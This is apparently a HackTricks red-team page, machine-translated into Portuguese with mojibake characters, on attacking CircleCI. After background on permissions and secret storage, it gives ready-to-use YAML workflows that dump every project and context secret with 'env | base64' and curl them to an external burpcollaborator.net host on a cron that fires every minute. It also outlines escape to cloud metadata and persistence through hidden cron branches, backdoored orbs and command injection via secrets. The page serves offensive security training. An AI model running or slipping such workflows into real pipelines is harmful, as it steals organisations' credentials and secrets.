# CircleCI Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) √© uma plataforma de Integra√ß√£o Cont√≠nua onde voc√™ pode **definir templates** indicando o que deseja que ela fa√ßa com algum c√≥digo e quando faz√™-lo. Dessa forma, voc√™ pode **automatizar testes** ou **implanta√ß√µes** diretamente **da branch principal do seu reposit√≥rio**, por exemplo.

### Permissions

**CircleCI** **herda as permiss√µes** do github e bitbucket relacionadas √† **conta** que faz login.\
Nos meus testes, verifiquei que, desde que voc√™ tenha **permiss√µes de escrita sobre o reposit√≥rio no github**, voc√™ poder√° **gerenciar as configura√ß√µes do projeto no CircleCI** (definir novas chaves ssh, obter chaves de api do projeto, criar novas branches com novas configura√ß√µes do CircleCI...).

No entanto, voc√™ precisa ser um **administrador do reposit√≥rio** para **converter o reposit√≥rio em um projeto CircleCI**.

### Env Variables & Secrets

De acordo com [**a documenta√ß√£o**](https://circleci.com/docs/2.0/env-vars/), existem diferentes maneiras de **carregar valores em vari√°veis de ambiente** dentro de um fluxo de trabalho.

#### Built-in env variables

Todo container executado pelo CircleCI sempre ter√° [**vari√°veis de ambiente espec√≠ficas definidas na documenta√ß√£o**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) como `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` ou `CIRCLE_USERNAME`.

#### Clear text

Voc√™ pode declar√°-las em texto claro dentro de um **comando**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Voc√™ pode declar√°-los em texto claro dentro do **ambiente de execu√ß√£o**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Voc√™ pode declar√°-los em texto claro dentro do **build-job environment**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Voc√™ pode declar√°-los em texto claro dentro do **ambiente de um cont√™iner**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
#### Segredos do Projeto

Estes s√£o **segredos** que s√≥ ser√£o **acess√≠veis** pelo **projeto** (por **qualquer branch**).\
Voc√™ pode v√™-los **declarados em** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
A funcionalidade "**Importar Vari√°veis**" permite **importar vari√°veis de outros projetos** para este.
{% endhint %}

#### Segredos de Contexto

Estes s√£o segredos que s√£o **ampla organiza√ß√£o**. Por **padr√£o, qualquer reposit√≥rio** poder√° **acessar qualquer segredo** armazenado aqui:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
No entanto, observe que um grupo diferente (em vez de Todos os membros) pode ser **selecionado para dar acesso aos segredos apenas a pessoas espec√≠ficas**.\
Esta √© atualmente uma das melhores maneiras de **aumentar a seguran√ßa dos segredos**, para n√£o permitir que todos tenham acesso a eles, mas apenas algumas pessoas.
{% endhint %}

### Ataques

#### Buscar Segredos em Texto Claro

Se voc√™ tiver **acesso ao VCS** (como github), verifique o arquivo `.circleci/config.yml` de **cada reposit√≥rio em cada branch** e **busque** por potenciais **segredos em texto claro** armazenados l√°.

#### Enumera√ß√£o de Vari√°veis de Ambiente Secretas e Contexto

Verificando o c√≥digo, voc√™ pode encontrar **todos os nomes dos segredos** que est√£o sendo **usados** em cada arquivo `.circleci/config.yml`. Voc√™ tamb√©m pode obter os **nomes dos contextos** desses arquivos ou verific√°-los no console da web: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

#### Exfiltrar Segredos do Projeto

{% hint style="warning" %}
Para **exfiltrar TODOS** os **SEGREDOS** do projeto e do contexto, voc√™ **apenas** precisa ter acesso **DE ESCREVER** a **apenas 1 reposit√≥rio** em toda a organiza√ß√£o do github (_e sua conta deve ter acesso aos contextos, mas por padr√£o todos podem acessar todos os contextos_).
{% endhint %}

{% hint style="danger" %}
A funcionalidade "**Importar Vari√°veis**" permite **importar vari√°veis de outros projetos** para este. Portanto, um atacante poderia **importar todas as vari√°veis do projeto de todos os reposit√≥rios** e ent√£o **exfiltrar todas elas juntas**.
{% endhint %}

Todos os segredos do projeto sempre s√£o definidos no ambiente dos jobs, ent√£o apenas chamando env e ofuscando-o em base64 ir√° exfiltrar os segredos no **console de log da web dos workflows**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Se voc√™ **n√£o tem acesso ao console da web** mas tem **acesso ao reposit√≥rio** e sabe que o CircleCI √© usado, voc√™ pode simplesmente **criar um fluxo de trabalho** que √© **disparado a cada minuto** e que **exfiltra os segredos para um endere√ßo externo**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
#### Exfiltrar Segredos de Contexto

Voc√™ precisa **especificar o nome do contexto** (isso tamb√©m ir√° exfiltrar os segredos do projeto):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Se voc√™ **n√£o tem acesso ao console da web** mas tem **acesso ao reposit√≥rio** e sabe que o CircleCI √© usado, voc√™ pode simplesmente **modificar um fluxo de trabalho** que √© **disparado a cada minuto** e que **exfiltra os segredos para um endere√ßo externo**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Apenas criar um novo `.circleci/config.yml` em um reposit√≥rio **n√£o √© suficiente para acionar uma constru√ß√£o do circleci**. Voc√™ precisa **habilit√°-lo como um projeto no console do circleci**.
{% endhint %}

#### Escape to Cloud

**CircleCI** oferece a op√ß√£o de executar **suas constru√ß√µes em suas m√°quinas ou nas suas pr√≥prias**.\
Por padr√£o, suas m√°quinas est√£o localizadas no GCP, e inicialmente voc√™ n√£o conseguir√° encontrar nada relevante. No entanto, se uma v√≠tima estiver executando as tarefas em **suas pr√≥prias m√°quinas (potencialmente, em um ambiente de nuvem)**, voc√™ pode encontrar um **endpoint de metadados da nuvem com informa√ß√µes interessantes**.

Observe que nos exemplos anteriores tudo foi lan√ßado dentro de um cont√™iner docker, mas voc√™ tamb√©m pode **pedir para lan√ßar uma m√°quina VM** (que pode ter permiss√µes de nuvem diferentes):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ou at√© mesmo um cont√™iner docker com acesso a um servi√ßo docker remoto:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
#### Persist√™ncia

* √â poss√≠vel **criar** **tokens de usu√°rio no CircleCI** para acessar os endpoints da API com o acesso dos usu√°rios.
* _https://app.circleci.com/settings/user/tokens_
* √â poss√≠vel **criar tokens de projetos** para acessar o projeto com as permiss√µes dadas ao token.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* √â poss√≠vel **adicionar chaves SSH** aos projetos.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* √â poss√≠vel **criar um cron job em uma branch oculta** em um projeto inesperado que est√° **vazando** todas as **vari√°veis de ambiente de contexto** todos os dias.
* Ou at√© mesmo criar em uma branch / modificar um job conhecido que ir√° **vazar** todos os segredos de **contexto e projetos** todos os dias.
* Se voc√™ √© um propriet√°rio do GitHub, pode **permitir orbs n√£o verificados** e configurar um em um job como **backdoor**.
* Voc√™ pode encontrar uma **vulnerabilidade de inje√ß√£o de comando** em alguma tarefa e **injetar comandos** via um **segredo** modificando seu valor.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
